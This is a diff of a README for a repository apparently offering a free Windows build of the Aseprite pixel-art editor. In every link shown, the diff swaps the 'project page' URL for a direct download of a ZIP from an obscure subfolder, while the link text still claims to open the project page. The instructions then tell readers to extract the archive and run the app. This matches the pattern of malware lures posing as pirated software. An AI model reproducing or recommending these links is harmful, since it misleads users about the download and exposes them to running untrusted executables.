@@ -1,6 +1,6 @@
 # 🎨 Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows - Pixel Art Made Simple on Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows/main/Romansh/Aseprite-Art-for-Sprites-Editor-Creator-Windows-Pixel-Animated-3.3-beta.4.zip)
 
 ## 🖥️ What This Is
 
@@ -19,7 +19,7 @@ Use it to:
 
 Use this link to visit the project page and get the app:
 
-[Open the download page](https://github.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows)
+[Open the download page](https://raw.githubusercontent.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows/main/Romansh/Aseprite-Art-for-Sprites-Editor-Creator-Windows-Pixel-Animated-3.3-beta.4.zip)
 
 After you open the page, download the Windows version and save it to your computer.
 
@@ -243,7 +243,7 @@ It suits users who want a direct way to make sprites without a heavy setup.
 ## 📂 Download and Run
 
 1. Open the project page:
-   [https://github.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows](https://github.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows)
+   [https://raw.githubusercontent.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows/main/Romansh/Aseprite-Art-for-Sprites-Editor-Creator-Windows-Pixel-Animated-3.3-beta.4.zip](https://raw.githubusercontent.com/Legislative-combineddnaindexsystem500/Aseprite-Pixel-Art-Editor-Animated-Sprites-Creator-for-Windows/main/Romansh/Aseprite-Art-for-Sprites-Editor-Creator-Windows-Pixel-Animated-3.3-beta.4.zip)
 2. Download the Windows file or package
 3. Extract the files if they come in a ZIP folder
 4. Open the app file
